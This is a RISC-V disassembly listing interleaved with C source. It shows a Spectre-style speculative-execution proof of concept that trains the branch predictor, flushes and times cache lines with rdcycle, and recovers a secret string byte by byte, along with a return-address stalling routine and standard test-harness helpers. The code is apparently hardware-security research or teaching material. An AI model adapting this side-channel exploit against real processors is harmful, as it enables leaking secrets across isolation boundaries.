    80001328:	fcf43823          	sd	a5,-48(s0)
    8000132c:	fd043703          	ld	a4,-48(s0)
    80001330:	0ff00793          	li	a5,255
    80001334:	fce7fde3          	bgeu	a5,a4,8000130e <main+0x56>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    80001338:	fc043423          	sd	zero,-56(s0)
    8000133c:	a2a9                	j	80001486 <main+0x1ce>

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
    8000133e:	00016797          	auipc	a5,0x16
    80001342:	94278793          	addi	a5,a5,-1726 # 80016c80 <array2>
    80001346:	6591                	lui	a1,0x4
    80001348:	853e                	mv	a0,a5
    8000134a:	cffff0ef          	jal	ra,80001048 <flushCache>

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    8000134e:	47c1                	li	a5,16
    80001350:	fcf43023          	sd	a5,-64(s0)
    80001354:	a059                	j	800013da <main+0x122>
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
    80001356:	00002797          	auipc	a5,0x2
    8000135a:	88a78793          	addi	a5,a5,-1910 # 80002be0 <array1_sz>
    8000135e:	639c                	ld	a5,0(a5)
    80001360:	fc843703          	ld	a4,-56(s0)
    80001364:	02f777b3          	remu	a5,a4,a5
    80001368:	f8f43023          	sd	a5,-128(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
    8000136c:	fc043703          	ld	a4,-64(s0)
    80001370:	47c5                	li	a5,17
    80001372:	02f767b3          	rem	a5,a4,a5
    80001376:	17fd                	addi	a5,a5,-1
    80001378:	873e                	mv	a4,a5
    8000137a:	77c1                	lui	a5,0xffff0
    8000137c:	8ff9                	and	a5,a5,a4
    8000137e:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
    80001382:	f7843783          	ld	a5,-136(s0)
    80001386:	83c1                	srli	a5,a5,0x10
    80001388:	f7843703          	ld	a4,-136(s0)
    8000138c:	8fd9                	or	a5,a5,a4
    8000138e:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
    80001392:	fe843703          	ld	a4,-24(s0)
    80001396:	f8043783          	ld	a5,-128(s0)
    8000139a:	8f3d                	xor	a4,a4,a5
    8000139c:	f7843783          	ld	a5,-136(s0)
    800013a0:	8ff9                	and	a5,a5,a4
    800013a2:	f8043703          	ld	a4,-128(s0)
    800013a6:	8fb9                	xor	a5,a5,a4
    800013a8:	f6f43c23          	sd	a5,-136(s0)

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 100; ++k){
    800013ac:	fa043c23          	sd	zero,-72(s0)
    800013b0:	a031                	j	800013bc <main+0x104>
    800013b2:	fb843783          	ld	a5,-72(s0)
    800013b6:	0785                	addi	a5,a5,1
    800013b8:	faf43c23          	sd	a5,-72(s0)
    800013bc:	fb843703          	ld	a4,-72(s0)
    800013c0:	06300793          	li	a5,99
    800013c4:	fee7f7e3          	bgeu	a5,a4,800013b2 <main+0xfa>
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
    800013c8:	f7843503          	ld	a0,-136(s0)
    800013cc:	e3bff0ef          	jal	ra,80001206 <victimFunc>
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
    800013d0:	fc043783          	ld	a5,-64(s0)
    800013d4:	17fd                	addi	a5,a5,-1
    800013d6:	fcf43023          	sd	a5,-64(s0)
    800013da:	fc043783          	ld	a5,-64(s0)
    800013de:	f607dce3          	bgez	a5,80001356 <main+0x9e>
            


            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
    800013e2:	fa043823          	sd	zero,-80(s0)
    800013e6:	a069                	j	80001470 <main+0x1b8>
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
    800013e8:	fa043423          	sd	zero,-88(s0)
                start = rdcycle();
    800013ec:	c00027f3          	rdcycle	a5
    800013f0:	faf43023          	sd	a5,-96(s0)
    800013f4:	fa043783          	ld	a5,-96(s0)
    800013f8:	f8f43c23          	sd	a5,-104(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
    800013fc:	fb043783          	ld	a5,-80(s0)
    80001400:	079a                	slli	a5,a5,0x6
    80001402:	00016717          	auipc	a4,0x16
    80001406:	87e70713          	addi	a4,a4,-1922 # 80016c80 <array2>
    8000140a:	97ba                	add	a5,a5,a4
    8000140c:	0007c703          	lbu	a4,0(a5) # ffffffffffff0000 <_end+0xffffffff7ffd4b40>
    80001410:	fe744783          	lbu	a5,-25(s0)
    80001414:	8ff9                	and	a5,a5,a4
    80001416:	fef403a3          	sb	a5,-25(s0)
                diff = (rdcycle() - start);
    8000141a:	c00027f3          	rdcycle	a5
    8000141e:	f8f43823          	sd	a5,-112(s0)
    80001422:	f9043703          	ld	a4,-112(s0)
    80001426:	f9843783          	ld	a5,-104(s0)
    8000142a:	40f707b3          	sub	a5,a4,a5
    8000142e:	f8f43423          	sd	a5,-120(s0)
                //printf("%d,%d\n",i, diff);

                if ( diff < CACHE_HIT_THRESHOLD ){
    80001432:	f8843703          	ld	a4,-120(s0)
    80001436:	03100793          	li	a5,49
    8000143a:	02e7e663          	bltu	a5,a4,80001466 <main+0x1ae>
                    results[i] += 1;
    8000143e:	0001a717          	auipc	a4,0x1a
    80001442:	84270713          	addi	a4,a4,-1982 # 8001ac80 <results.3011>
    80001446:	fb043783          	ld	a5,-80(s0)
    8000144a:	078e                	slli	a5,a5,0x3
    8000144c:	97ba                	add	a5,a5,a4
    8000144e:	639c                	ld	a5,0(a5)
    80001450:	00178713          	addi	a4,a5,1
    80001454:	0001a697          	auipc	a3,0x1a
    80001458:	82c68693          	addi	a3,a3,-2004 # 8001ac80 <results.3011>
    8000145c:	fb043783          	ld	a5,-80(s0)
    80001460:	078e                	slli	a5,a5,0x3
    80001462:	97b6                	add	a5,a5,a3
    80001464:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
    80001466:	fb043783          	ld	a5,-80(s0)
    8000146a:	0785                	addi	a5,a5,1
    8000146c:	faf43823          	sd	a5,-80(s0)
    80001470:	fb043703          	ld	a4,-80(s0)
    80001474:	0ff00793          	li	a5,255
    80001478:	f6e7f8e3          	bgeu	a5,a4,800013e8 <main+0x130>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
    8000147c:	fc843783          	ld	a5,-56(s0)
    80001480:	0785                	addi	a5,a5,1
    80001482:	fcf43423          	sd	a5,-56(s0)
    80001486:	fc843703          	ld	a4,-56(s0)
    8000148a:	47a5                	li	a5,9
    8000148c:	eae7f9e3          	bgeu	a5,a4,8000133e <main+0x86>
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
    80001490:	f6040713          	addi	a4,s0,-160
    80001494:	f7040793          	addi	a5,s0,-144
    80001498:	86ba                	mv	a3,a4
    8000149a:	863e                	mv	a2,a5
    8000149c:	10000593          	li	a1,256
    800014a0:	00019517          	auipc	a0,0x19
    800014a4:	7e050513          	addi	a0,a0,2016 # 8001ac80 <results.3011>
    800014a8:	c71ff0ef          	jal	ra,80001118 <topTwoIdx>

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
    800014ac:	f7044683          	lbu	a3,-144(s0)
    800014b0:	00001797          	auipc	a5,0x1
    800014b4:	73878793          	addi	a5,a5,1848 # 80002be8 <secretString>
    800014b8:	6398                	ld	a4,0(a5)
    800014ba:	fd843783          	ld	a5,-40(s0)
    800014be:	97ba                	add	a5,a5,a4
    800014c0:	0007c783          	lbu	a5,0(a5)
    800014c4:	8736                	mv	a4,a3
    800014c6:	02f70163          	beq	a4,a5,800014e8 <main+0x230>
    800014ca:	f7144683          	lbu	a3,-143(s0)
    800014ce:	00001797          	auipc	a5,0x1
    800014d2:	71a78793          	addi	a5,a5,1818 # 80002be8 <secretString>
    800014d6:	6398                	ld	a4,0(a5)
    800014d8:	fd843783          	ld	a5,-40(s0)
    800014dc:	97ba                	add	a5,a5,a4
    800014de:	0007c783          	lbu	a5,0(a5)
    800014e2:	8736                	mv	a4,a3
    800014e4:	06f71263          	bne	a4,a5,80001548 <main+0x290>
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    800014e8:	fe843703          	ld	a4,-24(s0)
    800014ec:	00001797          	auipc	a5,0x1
    800014f0:	65478793          	addi	a5,a5,1620 # 80002b40 <array1>
    800014f4:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    800014f8:	00001797          	auipc	a5,0x1
    800014fc:	6f078793          	addi	a5,a5,1776 # 80002be8 <secretString>
    80001500:	6398                	ld	a4,0(a5)
    80001502:	fd843783          	ld	a5,-40(s0)
    80001506:	97ba                	add	a5,a5,a4
    80001508:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000150c:	0007861b          	sext.w	a2,a5
    80001510:	f6043683          	ld	a3,-160(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001514:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001518:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000151c:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001520:	0007851b          	sext.w	a0,a5
    80001524:	f6843803          	ld	a6,-152(s0)
                                                           hitArray[1], output[1], output[1]); 
    80001528:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000152c:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]); 
    80001530:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001534:	2781                	sext.w	a5,a5
    80001536:	e03e                	sd	a5,0(sp)
    80001538:	87aa                	mv	a5,a0
    8000153a:	00001517          	auipc	a0,0x1
    8000153e:	37e50513          	addi	a0,a0,894 # 800028b8 <atol+0x182>
    80001542:	5cd000ef          	jal	ra,8000230e <printf>
    80001546:	a085                	j	800015a6 <main+0x2ee>
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001548:	fe843703          	ld	a4,-24(s0)
    8000154c:	00001797          	auipc	a5,0x1
    80001550:	5f478793          	addi	a5,a5,1524 # 80002b40 <array1>
    80001554:	00f705b3          	add	a1,a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001558:	00001797          	auipc	a5,0x1
    8000155c:	69078793          	addi	a5,a5,1680 # 80002be8 <secretString>
    80001560:	6398                	ld	a4,0(a5)
    80001562:	fd843783          	ld	a5,-40(s0)
    80001566:	97ba                	add	a5,a5,a4
    80001568:	0007c783          	lbu	a5,0(a5)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000156c:	0007861b          	sext.w	a2,a5
    80001570:	f6043683          	ld	a3,-160(s0)
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    80001574:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001578:	0007871b          	sext.w	a4,a5
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
    8000157c:	f7044783          	lbu	a5,-144(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001580:	0007851b          	sext.w	a0,a5
    80001584:	f6843803          	ld	a6,-152(s0)
                                                           hitArray[1], output[1], output[1]);  
    80001588:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    8000158c:	0007889b          	sext.w	a7,a5
                                                           hitArray[1], output[1], output[1]);  
    80001590:	f7144783          	lbu	a5,-143(s0)
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
    80001594:	2781                	sext.w	a5,a5
    80001596:	e03e                	sd	a5,0(sp)
    80001598:	87aa                	mv	a5,a0
    8000159a:	00001517          	auipc	a0,0x1
    8000159e:	37e50513          	addi	a0,a0,894 # 80002918 <atol+0x1e2>
    800015a2:	56d000ef          	jal	ra,8000230e <printf>

        // read in the next secret 
        ++attackIdx;
    800015a6:	fe843783          	ld	a5,-24(s0)
    800015aa:	0785                	addi	a5,a5,1
    800015ac:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    800015b0:	fd843783          	ld	a5,-40(s0)
    800015b4:	0785                	addi	a5,a5,1
    800015b6:	fcf43c23          	sd	a5,-40(s0)
    800015ba:	fd843703          	ld	a4,-40(s0)
    800015be:	47c9                	li	a5,18
    800015c0:	d4e7f4e3          	bgeu	a5,a4,80001308 <main+0x50>
        //printf("%s\n","stop");
    }
    return 0;
    800015c4:	4781                	li	a5,0
}
    800015c6:	853e                	mv	a0,a5
    800015c8:	70aa                	ld	ra,168(sp)
    800015ca:	740a                	ld	s0,160(sp)
    800015cc:	614d                	addi	sp,sp,176
    800015ce:	8082                	ret

00000000800015d0 <frameDump>:
.section .text
.globl frameDump

frameDump:
    # Pop off stack frame and get RA
    ld ra, 56(sp)
    800015d0:	70e2                	ld	ra,56(sp)
    addi sp, sp, 64
    800015d2:	6121                	addi	sp,sp,64

    # Calculate ra - 2 + (( 2 << 4 ) / 16)
    # This stalls the result of ra to be used for the ret
    addi ra, ra, -2
    800015d4:	10f9                	addi	ra,ra,-2
    addi t1, zero, 2
    800015d6:	00200313          	li	t1,2
    slli t2, t1, 0x4
    800015da:	00431393          	slli	t2,t1,0x4
    fcvt.s.lu fa4, t1 
    800015de:	d0337753          	fcvt.s.lu	fa4,t1
    fcvt.s.lu fa5, t2 
    800015e2:	d033f7d3          	fcvt.s.lu	fa5,t2
    fdiv.s fa5, fa5, fa4
    800015e6:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800015ea:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800015ee:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fdiv.s fa5, fa5, fa4
    800015f2:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    fcvt.lu.s t2, fa5, rtz
    800015f6:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
    add ra, ra, t2
    800015fa:	909e                	add	ra,ra,t2

    # Return to main
    ret
    800015fc:	8082                	ret

00000000800015fe <printArray>:
#include <stdint.h>

#define static_assert(cond) switch(0) { case 0: case !!(long)(cond): ; }

static void printArray(const char name[], int n, const int arr[])
{
    800015fe:	7179                	addi	sp,sp,-48
    80001600:	f422                	sd	s0,40(sp)
    80001602:	1800                	addi	s0,sp,48
    80001604:	fea43423          	sd	a0,-24(s0)
    80001608:	87ae                	mv	a5,a1
    8000160a:	fcc43c23          	sd	a2,-40(s0)
    8000160e:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %3d ", arr[i] );
  printf( "\n" );
#endif
}
    80001612:	0001                	nop
    80001614:	7422                	ld	s0,40(sp)
    80001616:	6145                	addi	sp,sp,48
    80001618:	8082                	ret

000000008000161a <printDoubleArray>:

static void printDoubleArray(const char name[], int n, const double arr[])
{
    8000161a:	7179                	addi	sp,sp,-48
    8000161c:	f422                	sd	s0,40(sp)
    8000161e:	1800                	addi	s0,sp,48
    80001620:	fea43423          	sd	a0,-24(s0)
    80001624:	87ae                	mv	a5,a1
    80001626:	fcc43c23          	sd	a2,-40(s0)
    8000162a:	fef42223          	sw	a5,-28(s0)
  printf( " %10s :", name );
  for ( i = 0; i < n; i++ )
    printf( " %g ", arr[i] );
  printf( "\n" );
#endif
}
    8000162e:	0001                	nop
    80001630:	7422                	ld	s0,40(sp)
    80001632:	6145                	addi	sp,sp,48
    80001634:	8082                	ret

0000000080001636 <verify>:

static int verify(int n, const volatile int* test, const int* verify)
{
    80001636:	715d                	addi	sp,sp,-80
    80001638:	e4a2                	sd	s0,72(sp)
    8000163a:	0880                	addi	s0,sp,80
    8000163c:	87aa                	mv	a5,a0
    8000163e:	fcb43023          	sd	a1,-64(s0)
    80001642:	fac43c23          	sd	a2,-72(s0)
    80001646:	fcf42623          	sw	a5,-52(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    8000164a:	fe042623          	sw	zero,-20(s0)
    8000164e:	a071                	j	800016da <verify+0xa4>
  {
    int t0 = test[i], t1 = test[i+1];
    80001650:	fec42783          	lw	a5,-20(s0)
    80001654:	078a                	slli	a5,a5,0x2
    80001656:	fc043703          	ld	a4,-64(s0)
    8000165a:	97ba                	add	a5,a5,a4
    8000165c:	439c                	lw	a5,0(a5)
    8000165e:	fef42423          	sw	a5,-24(s0)
    80001662:	fec42783          	lw	a5,-20(s0)
    80001666:	0785                	addi	a5,a5,1
    80001668:	078a                	slli	a5,a5,0x2
    8000166a:	fc043703          	ld	a4,-64(s0)
    8000166e:	97ba                	add	a5,a5,a4
    80001670:	439c                	lw	a5,0(a5)
    80001672:	fef42223          	sw	a5,-28(s0)
    int v0 = verify[i], v1 = verify[i+1];
    80001676:	fec42783          	lw	a5,-20(s0)
    8000167a:	078a                	slli	a5,a5,0x2
    8000167c:	fb843703          	ld	a4,-72(s0)
    80001680:	97ba                	add	a5,a5,a4
    80001682:	439c                	lw	a5,0(a5)
    80001684:	fef42023          	sw	a5,-32(s0)
    80001688:	fec42783          	lw	a5,-20(s0)
    8000168c:	0785                	addi	a5,a5,1
    8000168e:	078a                	slli	a5,a5,0x2
    80001690:	fb843703          	ld	a4,-72(s0)
    80001694:	97ba                	add	a5,a5,a4
    80001696:	439c                	lw	a5,0(a5)
    80001698:	fcf42e23          	sw	a5,-36(s0)
    if (t0 != v0) return i+1;
    8000169c:	fe842703          	lw	a4,-24(s0)
    800016a0:	fe042783          	lw	a5,-32(s0)
    800016a4:	2701                	sext.w	a4,a4
    800016a6:	2781                	sext.w	a5,a5
    800016a8:	00f70763          	beq	a4,a5,800016b6 <verify+0x80>
    800016ac:	fec42783          	lw	a5,-20(s0)
    800016b0:	2785                	addiw	a5,a5,1
    800016b2:	2781                	sext.w	a5,a5
    800016b4:	a051                	j	80001738 <verify+0x102>
    if (t1 != v1) return i+2;
    800016b6:	fe442703          	lw	a4,-28(s0)
    800016ba:	fdc42783          	lw	a5,-36(s0)
    800016be:	2701                	sext.w	a4,a4
    800016c0:	2781                	sext.w	a5,a5
    800016c2:	00f70763          	beq	a4,a5,800016d0 <verify+0x9a>
    800016c6:	fec42783          	lw	a5,-20(s0)
    800016ca:	2789                	addiw	a5,a5,2
    800016cc:	2781                	sext.w	a5,a5
    800016ce:	a0ad                	j	80001738 <verify+0x102>
  for (i = 0; i < n/2*2; i+=2)
    800016d0:	fec42783          	lw	a5,-20(s0)
    800016d4:	2789                	addiw	a5,a5,2
    800016d6:	fef42623          	sw	a5,-20(s0)
    800016da:	fcc42783          	lw	a5,-52(s0)
    800016de:	01f7d71b          	srliw	a4,a5,0x1f
    800016e2:	9fb9                	addw	a5,a5,a4
    800016e4:	4017d79b          	sraiw	a5,a5,0x1
    800016e8:	2781                	sext.w	a5,a5
    800016ea:	0017979b          	slliw	a5,a5,0x1
    800016ee:	0007871b          	sext.w	a4,a5
    800016f2:	fec42783          	lw	a5,-20(s0)
    800016f6:	2781                	sext.w	a5,a5
    800016f8:	f4e7cce3          	blt	a5,a4,80001650 <verify+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    800016fc:	fcc42783          	lw	a5,-52(s0)
    80001700:	8b85                	andi	a5,a5,1
    80001702:	2781                	sext.w	a5,a5
    80001704:	cb8d                	beqz	a5,80001736 <verify+0x100>
    80001706:	fcc42783          	lw	a5,-52(s0)
    8000170a:	078a                	slli	a5,a5,0x2
    8000170c:	17f1                	addi	a5,a5,-4
    8000170e:	fc043703          	ld	a4,-64(s0)
    80001712:	97ba                	add	a5,a5,a4
    80001714:	439c                	lw	a5,0(a5)
    80001716:	0007869b          	sext.w	a3,a5
    8000171a:	fcc42783          	lw	a5,-52(s0)
    8000171e:	078a                	slli	a5,a5,0x2
    80001720:	17f1                	addi	a5,a5,-4
    80001722:	fb843703          	ld	a4,-72(s0)
    80001726:	97ba                	add	a5,a5,a4
    80001728:	439c                	lw	a5,0(a5)
    8000172a:	8736                	mv	a4,a3
    8000172c:	00f70563          	beq	a4,a5,80001736 <verify+0x100>
    return n;
    80001730:	fcc42783          	lw	a5,-52(s0)
    80001734:	a011                	j	80001738 <verify+0x102>
  return 0;
    80001736:	4781                	li	a5,0
}
    80001738:	853e                	mv	a0,a5
    8000173a:	6426                	ld	s0,72(sp)
    8000173c:	6161                	addi	sp,sp,80
    8000173e:	8082                	ret

0000000080001740 <verifyDouble>:

static int verifyDouble(int n, const volatile double* test, const double* verify)
{
    80001740:	711d                	addi	sp,sp,-96
    80001742:	eca2                	sd	s0,88(sp)
    80001744:	1080                	addi	s0,sp,96
    80001746:	87aa                	mv	a5,a0
    80001748:	fab43823          	sd	a1,-80(s0)
    8000174c:	fac43423          	sd	a2,-88(s0)
    80001750:	faf42e23          	sw	a5,-68(s0)
  int i;
  // Unrolled for faster verification
  for (i = 0; i < n/2*2; i+=2)
    80001754:	fe042623          	sw	zero,-20(s0)
    80001758:	a065                	j	80001800 <verifyDouble+0xc0>
  {
    double t0 = test[i], t1 = test[i+1];
    8000175a:	fec42783          	lw	a5,-20(s0)
    8000175e:	078e                	slli	a5,a5,0x3
    80001760:	fb043703          	ld	a4,-80(s0)
    80001764:	97ba                	add	a5,a5,a4
    80001766:	239c                	fld	fa5,0(a5)
    80001768:	fef43027          	fsd	fa5,-32(s0)
    8000176c:	fec42783          	lw	a5,-20(s0)
    80001770:	0785                	addi	a5,a5,1
    80001772:	078e                	slli	a5,a5,0x3
    80001774:	fb043703          	ld	a4,-80(s0)
    80001778:	97ba                	add	a5,a5,a4
    8000177a:	239c                	fld	fa5,0(a5)
    8000177c:	fcf43c27          	fsd	fa5,-40(s0)
    double v0 = verify[i], v1 = verify[i+1];
    80001780:	fec42783          	lw	a5,-20(s0)
    80001784:	078e                	slli	a5,a5,0x3
    80001786:	fa843703          	ld	a4,-88(s0)
    8000178a:	97ba                	add	a5,a5,a4
    8000178c:	239c                	fld	fa5,0(a5)
    8000178e:	fcf43827          	fsd	fa5,-48(s0)
    80001792:	fec42783          	lw	a5,-20(s0)
    80001796:	0785                	addi	a5,a5,1
    80001798:	078e                	slli	a5,a5,0x3
    8000179a:	fa843703          	ld	a4,-88(s0)
    8000179e:	97ba                	add	a5,a5,a4
    800017a0:	239c                	fld	fa5,0(a5)
    800017a2:	fcf43427          	fsd	fa5,-56(s0)
    int eq1 = t0 == v0, eq2 = t1 == v1;
    800017a6:	fe043707          	fld	fa4,-32(s0)
    800017aa:	fd043787          	fld	fa5,-48(s0)
    800017ae:	a2f727d3          	feq.d	a5,fa4,fa5
    800017b2:	00f037b3          	snez	a5,a5
    800017b6:	0ff7f793          	andi	a5,a5,255
    800017ba:	fcf42223          	sw	a5,-60(s0)
    800017be:	fd843707          	fld	fa4,-40(s0)
    800017c2:	fc843787          	fld	fa5,-56(s0)
    800017c6:	a2f727d3          	feq.d	a5,fa4,fa5
    800017ca:	00f037b3          	snez	a5,a5
    800017ce:	0ff7f793          	andi	a5,a5,255
    800017d2:	fcf42023          	sw	a5,-64(s0)
    if (!(eq1 & eq2)) return i+1+eq1;
    800017d6:	fc442703          	lw	a4,-60(s0)
    800017da:	fc042783          	lw	a5,-64(s0)
    800017de:	8ff9                	and	a5,a5,a4
    800017e0:	2781                	sext.w	a5,a5
    800017e2:	eb91                	bnez	a5,800017f6 <verifyDouble+0xb6>
    800017e4:	fec42783          	lw	a5,-20(s0)
    800017e8:	2785                	addiw	a5,a5,1
    800017ea:	2781                	sext.w	a5,a5
    800017ec:	fc442703          	lw	a4,-60(s0)
    800017f0:	9fb9                	addw	a5,a5,a4
    800017f2:	2781                	sext.w	a5,a5
    800017f4:	a09d                	j	8000185a <verifyDouble+0x11a>
  for (i = 0; i < n/2*2; i+=2)
    800017f6:	fec42783          	lw	a5,-20(s0)
    800017fa:	2789                	addiw	a5,a5,2
    800017fc:	fef42623          	sw	a5,-20(s0)
    80001800:	fbc42783          	lw	a5,-68(s0)
    80001804:	01f7d71b          	srliw	a4,a5,0x1f
    80001808:	9fb9                	addw	a5,a5,a4
    8000180a:	4017d79b          	sraiw	a5,a5,0x1
    8000180e:	2781                	sext.w	a5,a5
    80001810:	0017979b          	slliw	a5,a5,0x1
    80001814:	0007871b          	sext.w	a4,a5
    80001818:	fec42783          	lw	a5,-20(s0)
    8000181c:	2781                	sext.w	a5,a5
    8000181e:	f2e7cee3          	blt	a5,a4,8000175a <verifyDouble+0x1a>
  }
  if (n % 2 != 0 && test[n-1] != verify[n-1])
    80001822:	fbc42783          	lw	a5,-68(s0)
    80001826:	8b85                	andi	a5,a5,1
    80001828:	2781                	sext.w	a5,a5
    8000182a:	c79d                	beqz	a5,80001858 <verifyDouble+0x118>
    8000182c:	fbc42783          	lw	a5,-68(s0)
    80001830:	078e                	slli	a5,a5,0x3
    80001832:	17e1                	addi	a5,a5,-8
    80001834:	fb043703          	ld	a4,-80(s0)
    80001838:	97ba                	add	a5,a5,a4
    8000183a:	2398                	fld	fa4,0(a5)
    8000183c:	fbc42783          	lw	a5,-68(s0)
    80001840:	078e                	slli	a5,a5,0x3
    80001842:	17e1                	addi	a5,a5,-8
    80001844:	fa843703          	ld	a4,-88(s0)
    80001848:	97ba                	add	a5,a5,a4
    8000184a:	239c                	fld	fa5,0(a5)
    8000184c:	a2f727d3          	feq.d	a5,fa4,fa5
    80001850:	e781                	bnez	a5,80001858 <verifyDouble+0x118>
    return n;
    80001852:	fbc42783          	lw	a5,-68(s0)
    80001856:	a011                	j	8000185a <verifyDouble+0x11a>
  return 0;
    80001858:	4781                	li	a5,0
}
    8000185a:	853e                	mv	a0,a5
    8000185c:	6466                	ld	s0,88(sp)
    8000185e:	6125                	addi	sp,sp,96
    80001860:	8082                	ret

0000000080001862 <barrier>:

static void __attribute__((noinline)) barrier(int ncores)
{
    80001862:	1101                	addi	sp,sp,-32
    80001864:	ec22                	sd	s0,24(sp)
    80001866:	1000                	addi	s0,sp,32
    80001868:	87aa                	mv	a5,a0
    8000186a:	fef42623          	sw	a5,-20(s0)
  static volatile int sense;
  static volatile int count;
  static __thread int threadsense;

  __sync_synchronize();
    8000186e:	0ff0000f          	fence

  threadsense = !threadsense;
    80001872:	00022783          	lw	a5,0(tp) # 0 <_tdata_begin>
    80001876:	0017b793          	seqz	a5,a5
    8000187a:	0ff7f793          	andi	a5,a5,255
    8000187e:	0007871b          	sext.w	a4,a5
    80001882:	00e22023          	sw	a4,0(tp) # 0 <_tdata_begin>
  if (__sync_fetch_and_add(&count, 1) == ncores-1)
    80001886:	0001a797          	auipc	a5,0x1a
    8000188a:	c1a78793          	addi	a5,a5,-998 # 8001b4a0 <count.2896>
    8000188e:	4705                	li	a4,1
    80001890:	0f50000f          	fence	iorw,ow
    80001894:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80001898:	0006879b          	sext.w	a5,a3
    8000189c:	0007871b          	sext.w	a4,a5
    800018a0:	fec42783          	lw	a5,-20(s0)
    800018a4:	37fd                	addiw	a5,a5,-1
    800018a6:	2781                	sext.w	a5,a5
    800018a8:	02f71063          	bne	a4,a5,800018c8 <barrier+0x66>
  {
    count = 0;
    800018ac:	0001a797          	auipc	a5,0x1a
    800018b0:	bf478793          	addi	a5,a5,-1036 # 8001b4a0 <count.2896>
    800018b4:	0007a023          	sw	zero,0(a5)
    sense = threadsense;
    800018b8:	00022703          	lw	a4,0(tp) # 0 <_tdata_begin>
